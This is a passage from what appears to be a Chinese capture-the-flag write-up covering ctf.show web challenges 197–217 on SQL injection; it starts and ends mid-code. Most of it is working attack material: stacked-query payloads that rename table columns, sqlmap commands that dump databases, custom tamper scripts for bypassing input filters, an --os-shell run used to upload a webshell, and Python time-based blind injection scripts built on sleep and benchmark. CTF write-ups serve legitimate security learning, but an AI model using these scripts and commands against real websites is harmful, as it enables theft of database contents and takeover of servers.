    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
</code></pre> 
<p>参考了Y大师的wp，既然无法获取值，那么也就无法知道pass的值，但是 id 字段的值我们是可以爆破的，那么也就是说我们可以把 pass 字段重命名为其他名字，把 id 字段重命名为 pass，这样查询语句在配对密码的时候，实际上就是配对的 id 字段的值，这样我们就可以通过爆破来登录了。</p> 
<p>这边有个要注意一下的是 username 的值要是0，不然是无法查到的，原理在 web 188 处已经说过了。</p> 
<pre><code>import requests
url = 'http://dc135671-ba79-40cd-a812-3651f3975d0b.challenge.ctf.show/api/'

for i in range(100):
    payload = '0;alter table ctfshow_user change pass succ varchar(255);alter table ctfshow_user change id pass varchar(255);'
    data = {
        'username': payload,
        'password': i
    }
    req = requests.post(url=url, data=data)
    if '登陆成功' in req.json()['msg']:
        print(req.json()['msg'])
        break
</code></pre> 
<h2><a id="web_198_648"></a>web 198</h2> 
<p>同上没有过滤alter 和 change。</p> 
<h2><a id="web_199_650"></a>web 199</h2> 
<p>查询语句</p> 
<pre><code>  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";
</code></pre> 
<p>返回逻辑：</p> 
<pre><code>  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
</code></pre> 
<p>payload:</p> 
<pre><code>1;show tables;
ctfshow_user
</code></pre> 
<p>原理：<br> 因为它 <code>$row[0]==$password</code> 也就是取第一个，而且 username=1，没有这个数据，那么它就会返回 show tables的内容，来和password 对比，此时我们只要令 password 等于它的第一个表名就可以了，我这边的就是courses。</p> 
<p>这题的原理和第 196 题的 <code>1;select(1);</code> 原理有异曲同工之妙。<br> <img src="https://images2.imgbox.com/86/9d/gOopQ3yQ_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web_200_680"></a>web 200</h2> 
<p>同 199<br> payload:</p> 
<pre><code>1;show tables;
ctfshow_user
</code></pre> 
<h2><a id="web_201_688"></a>web 201</h2> 
<p>sqlmap get 传参</p> 
<pre><code>暴库
python3 sqlmap.py -u "xxx/api/?id=1" --referer="ctf.show" -dbs

爆表
python3 sqlmap.py -u "xxx/api/?id=1" --referer="ctf.show" -D ctfshow_web -tables

列字段：
python3 sqlmap.py -u "xxx/api/?id=1" --referer="ctf.show" -D ctfshow_web -T ctfshow_user -columns

取值：
python3 sqlmap.py -u "xxx/api/?id=1" --referer="ctf.show" -D ctfshow_web -T ctfshow_user -C "id,pass,username" -dump
</code></pre> 
<h2><a id="web_202_704"></a>web 202</h2> 
<p>sqlmap post 传参</p> 
<pre><code>暴库
python3 sqlmap.py -u "http://ab8d64fc-10d2-4c1b-bcd0-2dd029e9ce05.challenge.ctf.show/api/" --data="id=1" --referer="ctf.show" -dbs

爆表
python3 sqlmap.py -u "http://ab8d64fc-10d2-4c1b-bcd0-2dd029e9ce05.challenge.ctf.show/api/" --data="id=1" --referer="ctf.show" -D ctfshow_web -tables

列字段
python3 sqlmap.py -u "http://ab8d64fc-10d2-4c1b-bcd0-2dd029e9ce05.challenge.ctf.show/api/" --data="id=1" --referer="ctf.show" -D ctfshow_web -T ctfshow_user -columns

取值
python3 sqlmap.py -u "http://ab8d64fc-10d2-4c1b-bcd0-2dd029e9ce05.challenge.ctf.show/api/" --data="id=1" --referer="ctf.show" -D ctfshow_web -T ctfshow_user -C "id,pass,username" -dump
</code></pre> 
<h2><a id="web_203_720"></a>web 203</h2> 
<p>sqlmap put 传参，传请求头，类型 content-type:text/plain ，以纯文本的形式。</p> 
<pre><code>暴库：
python3 sqlmap.py -u "http://b5b3fe65-c1bc-4180-8c93-9dd26d7b2ab0.challenge.ctf.show/api/index.php" --method=PUT --referer="ctf.show" --header="Content-type:text/plain" --data="id=1" -dbs

爆表：
python3 sqlmap.py -u "http://b5b3fe65-c1bc-4180-8c93-9dd26d7b2ab0.challenge.ctf.show/api/index.php" --method=PUT --referer="ctf.show" --header="Content-type:text/plain" --data="id=1" -D ctfshow_web -tables

列字段：
python3 sqlmap.py -u "http://b5b3fe65-c1bc-4180-8c93-9dd26d7b2ab0.challenge.ctf.show/api/index.php" --method=PUT --referer="ctf.show" --header="Content-type:text/plain" --data="id=1" -D ctfshow_web -T ctfshow_user -columns

取值：
python3 sqlmap.py -u "http://b5b3fe65-c1bc-4180-8c93-9dd26d7b2ab0.challenge.ctf.show/api/index.php" --method=PUT --referer="ctf.show" --header="Content-type:text/plain" --data="id=1" -D ctfshow_web -T ctfshow_user -C "id,pass,username" -dump
</code></pre> 
<h2><a id="web_204_736"></a>web 204</h2> 
<p>加个cookie</p> 
<pre><code>python3 sqlmap.py -u "http://a45faf4c-518d-4731-9486-64138ff083a1.challenge.ctf.show/api/index.php" --method=PUT --referer="ctf.show" --header="Content-type:text/plain" --data="id=1" -D ctfshow_web -T ctfshow_user -C "id,pass,username" --cookie "PHPSESSID=s6egtcvda6lq40nmk79mnnng16; ctfshow=7c23a843555c58b3a68bbd0b686057b6" --dump
</code></pre> 
<h2><a id="web_205_742"></a>web 205</h2> 
<p>每次访问 api/index.php的时候，要先访问 api/getToken.php</p> 
<p><img src="https://images2.imgbox.com/99/75/ZEAj3XYf_o.png" alt="在这里插入图片描述"></p> 
<pre><code>--safe-url 设置在测试目标地址前访问的安全链接
--safe-freq 设置两次注入测试前访问安全链接的次数
</code></pre> 
<pre><code>爆库：
python3 sqlmap.py -u http://66c741d5-a5e5-42ea-9073-1d9de9056f4d.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --dbms=mysql dbs=ctfshow_web --headers="Content-Type: text/plain" --safe-url=http://66c741d5-a5e5-42ea-9073-1d9de9056f4d.challenge.ctf.show/api/getToken.php --safe-freq=1 -dbs

爆表：
python3 sqlmap.py -u http://66c741d5-a5e5-42ea-9073-1d9de9056f4d.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --dbms=mysql dbs=ctfshow_web --headers="Content-Type: text/plain" --safe-url=http://66c741d5-a5e5-42ea-9073-1d9de9056f4d.challenge.ctf.show/api/getToken.php --safe-freq=1 -tables

爆列：
python3 sqlmap.py -u http://66c741d5-a5e5-42ea-9073-1d9de9056f4d.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --dbms=mysql dbs=ctfshow_web --headers="Content-Type: text/plain" --safe-url=http://66c741d5-a5e5-42ea-9073-1d9de9056f4d.challenge.ctf.show/api/getToken.php --safe-freq=1 -T ctfshow_flax -columns

爆值：
python3 sqlmap.py -u http://66c741d5-a5e5-42ea-9073-1d9de9056f4d.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --dbms=mysql dbs=ctfshow_web --headers="Content-Type: text/plain" --safe-url=http://66c741d5-a5e5-42ea-9073-1d9de9056f4d.challenge.ctf.show/api/getToken.php --safe-freq=1 -T ctfshow_flax -C flagx -dump
</code></pre> 
<h2><a id="web_206_767"></a>web 206</h2> 
<p>和上面一样，sqlmap 会自己判断闭合</p> 
<pre><code>python3 sqlmap.py -u http://66c741d5-a5e5-42ea-9073-1d9de9056f4d.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --dbms=mysql dbs=ctfshow_web --headers="Content-Type: text/plain" --safe-url=http://66c741d5-a5e5-42ea-9073-1d9de9056f4d.challenge.ctf.show/api/getToken.php --safe-freq=1 -dbs

python3 sqlmap.py -u http://47cb5a33-c72f-4473-813c-bd5b60499cf7.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --dbms=mysql dbs=ctfshow_web --headers="Content-Type: text/plain" --safe-url=http://47cb5a33-c72f-4473-813c-bd5b60499cf7.challenge.ctf.show/api/getToken.php --safe-freq=1 -tables

python3 sqlmap.py -u http://47cb5a33-c72f-4473-813c-bd5b60499cf7.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --dbms=mysql dbs=ctfshow_web --headers="Content-Type: text/plain" --safe-url=http://47cb5a33-c72f-4473-813c-bd5b60499cf7.challenge.ctf.show/api/getToken.php --safe-freq=1 -T ctfshow_flaxc -columns

python3 sqlmap.py -u http://47cb5a33-c72f-4473-813c-bd5b60499cf7.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --dbms=mysql dbs=ctfshow_web --headers="Content-Type: text/plain" --safe-url=http://47cb5a33-c72f-4473-813c-bd5b60499cf7.challenge.ctf.show/api/getToken.php --safe-freq=1 -T ctfshow_flaxc -C flagv -dump
</code></pre> 
<h2><a id="web_207_778"></a>web 207</h2> 
<p>sqlmap tamper 中的 space2comment.py 模块绕waf ，将空格替换成 /**/</p> 
<pre><code>爆库：
python3 sqlmap.py -u http://6838c828-3f09-49df-8dbb-b547305fb652.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --dbms=mysql --headers="Content-Type: text/plain" --safe-url=http://6838c828-3f09-49df-8dbb-b547305fb652.challenge.ctf.show/api/getToken.php --safe-freq=1 -dbs --tamper  space2comment.py

爆表
python sqlmap.py -u http://6838c828-3f09-49df-8dbb-b547305fb652.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://6838c828-3f09-49df-8dbb-b547305fb652.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -tables --tamper  space2comment.py

爆列
python sqlmap.py -u http://6838c828-3f09-49df-8dbb-b547305fb652.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://6838c828-3f09-49df-8dbb-b547305fb652.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flaxca -columns --tamper  space2comment.py

值：
python sqlmap.py -u http://6838c828-3f09-49df-8dbb-b547305fb652.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://6838c828-3f09-49df-8dbb-b547305fb652.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flaxca -C flagvc -dump --tamper  space2comment.py
</code></pre> 
<h2><a id="web_208_793"></a>web 208</h2> 
<p>同上也是过滤了空格</p> 
<pre><code>python sqlmap.py -u http://b4cc87b6-aa2e-4674-99c9-ad72bcf16ed1.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://b4cc87b6-aa2e-4674-99c9-ad72bcf16ed1.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flaxcac -C flagvca -dump --tamper  space2comment.py
</code></pre> 
<h2><a id="web_209_798"></a>web 209</h2> 
<p>利用自写 tamper 绕过</p> 
<p>用 like 代替 =</p> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python</span>

<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY

__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    retVal <span class="token operator">=</span> payload
    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> <span class="token string">""</span>
        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>
                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote
            
            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token string">'like'</span>
                <span class="token keyword">continue</span>
                
            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

    <span class="token keyword">return</span> retVal
</code></pre> 
<pre><code>python sqlmap.py -u http://2c762843-49fe-4240-971c-fdd77077b992.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://2c762843-49fe-4240-971c-fdd77077b992.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx -dump --batch --tamper 209.py
</code></pre> 
<h2><a id="web_210_849"></a>web 210</h2> 
<p>题目对查询的字符解密，我们只要倒着加密就行了<br> <img src="https://images2.imgbox.com/99/1e/7mcl5sJc_o.png" alt="在这里插入图片描述"></p> 
<pre><code>#!/usr/bin/env python

"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.compat import xrange
from lib.core.enums import PRIORITY
import base64
__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):

    retVal = payload
    if payload:
        retVal = base64.b64encode(base64.b64encode(retVal[::-1])[::-1])

    return retVal
</code></pre> 
<pre><code>python sqlmap.py -u http://a98dab94-814e-4e98-89a9-8db3e97fe5a3.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://a98dab94-814e-4e98-89a9-8db3e97fe5a3.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx -dump --batch --tamper 210.py
</code></pre> 
<h2><a id="web_211212_882"></a>web 211-212</h2> 
<p>把前面几题的绕过合起来就可以了。</p> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/env python</span>

<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span>
<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY
<span class="token keyword">import</span> base64
__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW

<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>

    retVal <span class="token operator">=</span> payload

    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
        retVal <span class="token operator">=</span> <span class="token string">""</span>
        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>

        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>
                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>
                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                    <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>
                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>
                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote
            
            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>
                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> retVal
</code></pre> 
<p>web 211:</p> 
<pre><code>python sqlmap.py -u http://cb46c1a4-088f-4774-9165-9e660914ca23.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://cb46c1a4-088f-4774-9165-9e660914ca23.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa -dump --dbms mysql --batch --tamper 209.py
</code></pre> 
<p>web 212:</p> 
<pre><code>python sqlmap.py -u http://4232bc6a-71ab-4ddc-aa3a-3cc314bb1ac0.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://4232bc6a-71ab-4ddc-aa3a-3cc314bb1ac0.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flavis -C ctfshow_flagxsa -dump --batch --dbms mysql --tamper 209.py
</code></pre> 
<h2><a id="web_213_938"></a>web 213</h2> 
<p>这边我没用运行成功，手动提交的</p> 
<pre><code>python sqlmap.py -u http://66089777-b764-4e48-8082-8a4a60818706.challenge.ctf.show/api/index.php --data="id=1" --method=PUT --headers="Content-Type: text/plain" --safe-url="http://66089777-b764-4e48-8082-8a4a60818706.challenge.ctf.show/api/getToken.php" --safe-freq=1 --user-agent sqlmap --referer http://66089777-b764-4e48-8082-8a4a60818706.challenge.ctf.show/sqlmap.php --tamper 209.py --os-shell
</code></pre> 
<p><img src="https://images2.imgbox.com/87/ea/0rtVjiO9_o.png" alt="在这里插入图片描述"><br> 提交一个webshell，然后访问 getflag<br> <img src="https://images2.imgbox.com/ba/ca/YH3LMVal_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/fd/a2/uEsPYj9L_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="web214_949"></a>web214</h2> 
<p>学到了，看网络请求<br> <img src="https://images2.imgbox.com/73/d4/1hXBcq0E_o.png" alt="在这里插入图片描述"><br> 对前面的时间盲注脚本稍微改下就行了</p> 
<pre><code class="prism language-php">import requests
import time

url <span class="token operator">=</span> <span class="token string double-quoted-string">"http://340543db-5d51-4299-8b72-ad9e2b48be8f.challenge.ctf.show/api/index.php"</span>

name <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token constant boolean">True</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">&lt;</span> tail<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token class-name return-type">time</span><span class="token operator">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
        mid <span class="token operator">=</span> head <span class="token operator">+</span> tail <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        payload <span class="token operator">=</span> <span class="token string single-quoted-string">'if(ascii(mid((select flaga from ctfshow_flagx),%d,1))&gt;%d,sleep(2),0)'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string single-quoted-string">'ip'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'debug'</span><span class="token punctuation">:</span><span class="token number">0</span>
        <span class="token punctuation">}</span>
        time1 <span class="token operator">=</span> time<span class="token operator">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        time2 <span class="token operator">=</span> time<span class="token operator">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>time2<span class="token operator">-</span>time1<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        name <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">ascii</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
</code></pre> 
<h2><a id="web_215_989"></a>web 215</h2> 
<p>提示我们单引号，那么直接把它闭合</p> 
<p><img src="https://images2.imgbox.com/36/28/2CpOHi03_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-php">import requests
import time

url <span class="token operator">=</span> <span class="token string double-quoted-string">"http://0897b19e-9284-4e80-a37f-2d69df3c5e62.challenge.ctf.show/api/index.php"</span>

name <span class="token operator">=</span> <span class="token string double-quoted-string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token constant boolean">True</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head <span class="token operator">&lt;</span> tail<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token class-name return-type">time</span><span class="token operator">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
        mid <span class="token operator">=</span> head <span class="token operator">+</span> tail <span class="token operator">&gt;&gt;</span> <span class="token number">1</span>
        payload <span class="token operator">=</span> <span class="token string double-quoted-string">"' or if(ascii(mid((select group_concat(flagaa) from ctfshow_flagxc),%d,1))&gt;%d,sleep(2),0)#"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string single-quoted-string">'ip'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'debug'</span><span class="token punctuation">:</span><span class="token number">0</span>
        <span class="token punctuation">}</span>
        time1 <span class="token operator">=</span> time<span class="token operator">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        time2 <span class="token operator">=</span> time<span class="token operator">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>time2<span class="token operator">-</span>time1<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            tail <span class="token operator">=</span> mid
    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        name <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">ascii</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
</code></pre> 
<h2><a id="web_216_1029"></a>web 216</h2> 
<p>闭合 base64 编码</p> 
<p><img src="https://images2.imgbox.com/de/ee/2KJ9jW9t_o.png" alt="在这里插入图片描述"></p> 
<pre><code>import requests
import time

url = "http://3fa5cc39-750e-4b78-80c4-7b8b0518cf2c.challenge.ctf.show/api/index.php"

name = ""
i = 0
while True:
    head = 32
    tail = 127
    i += 1
    while (head &lt; tail):
        time.sleep(0.1)
        mid = head + tail &gt;&gt; 1
        payload = "'') or if(ascii(mid((select group_concat(flagaac) from ctfshow_flagxcc),%d,1))&gt;%d,sleep(2),0)#" % (i, mid)
        data = {
            'ip':payload,
            'debug':0
        }
        time1 = time.time()
        r = requests.post(url=url,data=data)
        time2 = time.time()
        if (time2-time1) &gt; 2:
            head = mid + 1
        else:
            tail = mid
    if head != 32:
        name += chr(head)
        print(ascii(name))
    else:
        continue
</code></pre> 
<h2><a id="web_217_1068"></a>web 217</h2> 
<p>利用 banchmark 盲注</p> 
<p>原理是通过 banchmark 可以计算某些操作的执行速度。</p> 
<p>利用 <code>benchmark(3145140,md5(2333))</code> 代替 <code>sleep(0.5)</code><br> <img src="https://images2.imgbox.com/64/3f/QcSkiOL6_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://3294aabf-4c66-49e5-bfd6-fa589a885b2d.challenge.ctf.show/api/index.php"</span>

name <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>
    i <span class="token operator">+=</span> <span class="token number">1</span>
